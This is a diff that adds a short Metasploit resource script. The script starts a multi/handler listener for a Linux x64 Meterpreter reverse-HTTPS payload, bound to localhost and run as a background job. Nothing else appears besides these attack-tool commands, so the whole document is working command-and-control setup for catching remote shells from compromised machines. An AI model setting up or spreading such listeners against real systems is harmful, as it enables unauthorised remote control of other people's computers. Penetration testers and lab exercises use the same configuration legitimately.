@@ -1,0 +1,4 @@
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter_reverse_https 
+set LHOST 127.0.0.1
+run -j
